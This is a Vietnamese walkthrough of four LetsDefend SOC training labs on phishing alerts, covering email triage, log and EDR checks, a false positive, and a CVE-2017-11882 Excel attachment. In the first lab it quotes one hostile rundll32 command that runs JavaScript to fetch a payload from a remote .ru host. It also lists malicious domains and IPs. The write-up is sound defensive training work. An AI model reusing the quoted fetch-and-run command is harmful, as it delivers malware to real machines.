Tổng quan về Lab Phising mail trên letdefend

**Phần 1**

    *SOC141 Phising URL Detected*

![image](https://hackmd.io/_uploads/Byb9jnU51e.png)


Mình sẽ vào phần Monitoring để xem chi tiết EVENT ID : 86
![image](https://hackmd.io/_uploads/Sy50j2U9kx.png)
URL cần phân tích : 
mogagrocol.ru

Tiếp theo là tạo PlayBook: 
Playbook rất quan trọng đối với Trung tâm điều hành bảo mật vì một số lý do. Một vài trong số những lý do đó là Tính nhất quán và Chuẩn hóa. Playbook đảm bảo rằng các phản ứng sự cố được xử lý nhất quán .
![image](https://hackmd.io/_uploads/S1ArTnU5yg.png)
Sau khi tạo playbook thành công ta sẽ bắt đầu đi tìm các yêu cầu mà PlayBook đề ra :
![image](https://hackmd.io/_uploads/BkbxhnIq1x.png)

+ Source Address : 172.16.17.49
+ Destination Address: 91.189.114.8
+ User-Agent: 
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.

Ở đây mình thực hiện kiểm tra với các thông số :
IP address : 172.16.17.49
URL : mogagrocol.ru
kết quả từ AV cho ra ![image](https://hackmd.io/_uploads/By28Ch8q1l.png)

Mình sẽ kiểm tra các EDR : 
![image](https://hackmd.io/_uploads/SkuTA2I9Jl.png)
1 endpoint đã bị ảnh hưởng .
Kiểm tra Network action và Terminal History để xem các hành động đáng ngờ : 

rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'

Đoạn mã dùng rundll32.exe ( một công cụ hợp pháp của windows) để thực thi mã JAVASCRIPT từ xa  tải mã độc KBDYAK.exe về mấy như hình dưới

![image](https://hackmd.io/_uploads/rkYt16Ickg.png)
Cuối cùng gửi các cảnh báo thông qua playbook 

![image](https://hackmd.io/_uploads/B1TfNTL5Jx.png)
**Phần 2**

    SOC140 - Phishing Mail Detected - Suspicious Task Scheduler

Đầu tiên mình sẽ phải xem qua các Thông tin ở phần này và trả lời các câu hỏi sau:
![image](https://hackmd.io/_uploads/SJIOBT891g.png)

When was it sent?
Mar, 21, 2021, 12:26 PM

What is the email's SMTP address?
189.162.189.159

What is the sender address?
aaronluo@cmail.carleton.ca

What is the recipient address?
mark@letsdefend.io

Is the mail content suspicious?
We will have to scan the attachment using resources to determine if it malicious or not.

Are there any attachment?
We will have to check emails. The Mail Tab.

![image](https://hackmd.io/_uploads/HkFKU6U9ye.png)
Check mail ta có thể thấy được tiêu đề COVID vaccine giống với ban đầu :
![image](https://hackmd.io/_uploads/Bks2LaLcJx.png)
Check trên AV ta có thể thấy tệp đính kèm độc hại.
Kiểm tra RAW log trên LOg manage
![image](https://hackmd.io/_uploads/SkqXF6Iqkg.png)
![image](https://hackmd.io/_uploads/r17fFpU9Je.png)
Thì mình có thấy dest.address :
172.16.20.3
Kiểm tra trên end point thì nó thuộc về Windows Exchange Server
![image](https://hackmd.io/_uploads/HJrtt6I91e.png)

Vì vậy, về cơ bản địa chỉ SMTP: 189.162.189.159 đã sử dụng địa chỉ email nguồn aaronluo@cmail.carleton.ca (như một sự ngụy trang) để cố gắng gửi email đến mark@letsdefend.io bằng Exchange Server. Nhưng có vẻ như nó đã bị chặn trong máy chủ trước khi đến được mark@letsdefend.io


**Phần 3**

    SOC120 - Phishing Mail Detected - Internal to Internal

![image](https://hackmd.io/_uploads/HycU-RI91g.png)

When was it sent?
Feb, 07, 2021, 04:24 AM

What is the email's SMTP address?
172.16.20.3

What is the sender address?

john@letsdefend.io

What is the recipient address?
susie@letsdefend.io

Is the mail content suspicious?
No
![image](https://hackmd.io/_uploads/SkWjf08cyx.png)
Dựa vào thông tin trên mình tìm thấy mail mời meeting 

Tóm lại , đây là mà cảnh báo false positive

** Phần cuối 4**

	SOC114 - Malicious Attachment Detected - Phishing Alert
    
tiếp đến phần cuối cùng trong chương Mail Phishing Analysis.
![image](https://hackmd.io/_uploads/B1Ef6ZPq1g.png)
Mở monitoring và xem các thông tin cơ bản
 Mình sẽ tạo Case report và mở trong Case management:
![image](https://hackmd.io/_uploads/HkK06bv5Jl.png)

Tương tự như các phần khác : 
Mình sẽ xác định các câu hỏi 

When was it sent?
Jan, 31, 2021, 03:48 PM

What is the email's SMTP address?
49.234.43.39

What is the sender address?
accounting@cmail.carleton.ca

What is the recipient address?

richard@letsdefend.io

Is the mail content suspicious?


Are there any attachment?

Để xác định hai câu hỏi này mình sẽ phân tích sau : 
Xác định SMTP có độc hại không ? 

49.234.43.39 
![image](https://hackmd.io/_uploads/rkJjCWvqJe.png)
Ở đây không có dấu hiệu khả nghi

Kiểm tra trong Mail Security : 
![image](https://hackmd.io/_uploads/HJn1JfDcyg.png)
Thấy có 1 tệp đính kèm và thông tin hoàn toàn trùng khớp
Mình sẽ phân tích tĩnh file đính kèm 
![image](https://hackmd.io/_uploads/r1P7JMDcJe.png)

Mình sẽ xem xét các EndPoint có bị ảnh hưởng không ?
ĐẾN phần Log management RAW LOG : 
![image](https://hackmd.io/_uploads/BkExlfDq1x.png)


Mình kiểm tra trên app ANY.RUN để phân tích động 
![image](https://hackmd.io/_uploads/ry_iEMwq1x.png)

Ở đây, chúng ta có thể thấy một tệp exe khác đã được khởi chạy sau khi thực thi MS Excel. Chắc chắn không phải là những gì một tệp Excel hợp lệ sẽ làm. Những tệp này được AnyRun tự động xác định là 100% độc hại.
Xuất hiện 1 tiến trình EQNEDT32.EXE  
![image](https://hackmd.io/_uploads/H1-gSMwqJe.png)

2 kết quả phân tích đều cho ra được CVE-2017-11882 

Mình sẽ tìm các domain có liên quan đến CVE này : 
![image](https://hackmd.io/_uploads/ryyfdMD5Jg.png)

chúng ta có thể tìm thấy domain andaluciabeach.net và ip 5.135.143.133 trong Log Management

![image](https://hackmd.io/_uploads/BkNhFzvcJe.png)
 
 Chúng ta thấy được một lưu lượng người có truy cập từ người dùng có địa chỉ ip "172.16.17.45" đến địa chỉ URL có tệp exe độc hại và thành công
 
 Khi chúng ta kiểm tra các endpoint thì phát hiện "RICHARDRPD"
 ![image](https://hackmd.io/_uploads/ry3XizD51g.png)

ĐI vào chi tiết : 
Xem lịch sử trình duyệt và các network action 
![image](https://hackmd.io/_uploads/HkBPsfDcye.png)
![image](https://hackmd.io/_uploads/HkwOjfvqkl.png)

Trong phần History process, chúng ta có thể thấy có tiến trình EQNEDT32.exe và Juicy Potato được sử dụng cho tiến trình nâng cao đặc quyền.
![image](https://hackmd.io/_uploads/Bk1LemP5kl.png)

Và đó là kết thúc quá trình analyst cho 4 bài lab nhỏ của letdefend
